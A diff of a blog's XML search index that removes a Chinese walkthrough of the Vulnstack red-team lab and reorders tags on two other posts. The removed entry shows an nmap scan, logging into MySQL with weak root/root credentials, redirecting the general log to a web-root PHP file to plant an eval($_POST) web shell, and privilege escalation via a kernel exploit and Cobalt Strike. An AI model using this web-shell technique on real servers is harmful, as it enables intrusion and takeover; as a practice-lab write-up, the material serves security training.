@@ -23,19 +23,6 @@
   
   
   <entry>
-    <title>ATT&amp;CK实战系列-红队评估 （一）Vulnstack三层网络域渗透靶场</title>
-    <link href="/2023/01/17/ATT/"/>
-    <url>/2023/01/17/ATT/</url>
-    
-    <content type="html"><![CDATA[<h1 id="ATT-amp-CK实战系列-红队评估-（一）Vulnstack三层网络域渗透靶场"><a href="#ATT-amp-CK实战系列-红队评估-（一）Vulnstack三层网络域渗透靶场" class="headerlink" title="ATT&amp;CK实战系列-红队评估 （一）Vulnstack三层网络域渗透靶场"></a>ATT&amp;CK实战系列-红队评估 （一）Vulnstack三层网络域渗透靶场</h1><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sV -sS -Pn <span class="hljs-number">192.168.147.233</span><br><span class="hljs-attribute">Starting</span> Nmap <span class="hljs-number">7</span>.<span class="hljs-number">93</span> ( https://nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">01</span>-<span class="hljs-number">17</span> <span class="hljs-number">13</span>:<span class="hljs-number">43</span> CST<br><span class="hljs-attribute">Nmap</span> scan report for <span class="hljs-number">192.168.147.233</span><br><span class="hljs-attribute">Host</span> is up (<span class="hljs-number">0</span>.<span class="hljs-number">00032</span>s latency).<br><span class="hljs-attribute">Not</span> shown: <span class="hljs-number">997</span> filtered tcp ports (no-response)<br><span class="hljs-attribute">PORT</span>     STATE SERVICE VERSION<br><span class="hljs-attribute">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">23</span> ((Win32) OpenSSL/<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span>j PHP/<span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">45</span>)<br><span class="hljs-attribute">135</span>/tcp  open  msrpc   Microsoft Windows RPC<br><span class="hljs-attribute">3306</span>/tcp open  mysql   MySQL (unauthorized)<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">17</span>:<span class="hljs-number">06</span>:<span class="hljs-number">52</span> (VMware)<br><span class="hljs-attribute">Service</span> Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br></code></pre></td></tr></table></figure><h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><h4 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h4><p>phpstudy探针</p><img src="/2023/01/17/ATT/image-20230117160408897.png" class="" title="image-20230117160408897"><p>尝试弱口令 root root 成功连接</p><p>目录扫描</p><img src="/2023/01/17/ATT/image-20230117160604626.png" class="" title="image-20230117160604626"><img src="/2023/01/17/ATT/image-20230117160656584.png" class="" title="image-20230117160656584"><p>尝试弱口令 root root登陆成功</p><img src="/2023/01/17/ATT/image-20230117160739266.png" class="" title="image-20230117160739266"><p>尝试写马，查询日志是否开启</p><img src="/2023/01/17/ATT/image-20230117161327617.png" class="" title="image-20230117161327617"><p>发现并未开启</p><img src="/2023/01/17/ATT/image-20230117161409855.png" class="" title="image-20230117161409855"><p>下面设置general_log&#x3D;on，并且设置日志文件地址为www下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> GLOBAL <span class="hljs-attribute">general_log</span>=ON;<br><span class="hljs-built_in">set</span> GLOBAL general_log_file = <span class="hljs-string">&quot;C:\phpStudy\WWW\muma.php&quot;</span><br></code></pre></td></tr></table></figure><img src="/2023/01/17/ATT/image-20230117162026720.png" class="" title="image-20230117162026720"><p>执行查询操作写马</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[hack]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p>执行成功后，连接</p><p><img src="C:\Users\sovo\AppData\Roaming\Typora\typora-user-images\image-20230117163210191.png" alt="image-20230117163210191"></p><p>下面尝试上传个木马然后提权</p><p><img src="C:\Users\sovo\AppData\Roaming\Typora\typora-user-images\image-20230117164419394.png" alt="image-20230117164419394"></p><p>shell systeminfo</p><p><img src="C:\Users\sovo\AppData\Roaming\Typora\typora-user-images\image-20230117165534362.png" alt="image-20230117165534362"></p><p>在线网站辅助提权<a href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p><p><a href="https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2021-1732">https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2021-1732</a></p><p>通过cs默认的提权方法也可以提权</p><p><img src="C:\Users\sovo\AppData\Roaming\Typora\typora-user-images\image-20230117171732279.png" alt="image-20230117171732279"></p><p><img src="C:\Users\sovo\AppData\Roaming\Typora\typora-user-images\image-20230117171853002.png" alt="image-20230117171853002"></p><h4 id="密码信息收集"><a href="#密码信息收集" class="headerlink" title="密码信息收集"></a>密码信息收集</h4><img src="/2023/01/17/ATT/image-20230127120856529.png" class="" title="image-20230127120856529"><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><img src="/2023/01/17/ATT/image-20230127121029831.png" class="" title="image-20230127121029831"><p>发现内网ip<code>192.168.52.</code></p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>Dapp学习总结-智能合约部署测试及go交互</title>
     <link href="/2023/01/13/Dapp%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%83%A8%E7%BD%B2%E6%B5%8B%E8%AF%95%E5%8F%8Ago%E4%BA%A4%E4%BA%92/"/>
     <url>/2023/01/13/Dapp%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93-%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%83%A8%E7%BD%B2%E6%B5%8B%E8%AF%95%E5%8F%8Ago%E4%BA%A4%E4%BA%92/</url>
@@ -52,9 +39,9 @@
     
     <tags>
       
-      <tag>go</tag>
-      
       <tag>区块链</tag>
+      
+      <tag>go</tag>
       
       <tag>ganache</tag>
       
@@ -323,9 +310,9 @@
     
     <tags>
       
-      <tag>gopher</tag>
-      
       <tag>web</tag>
+      
+      <tag>gopher</tag>
       
     </tags>
     
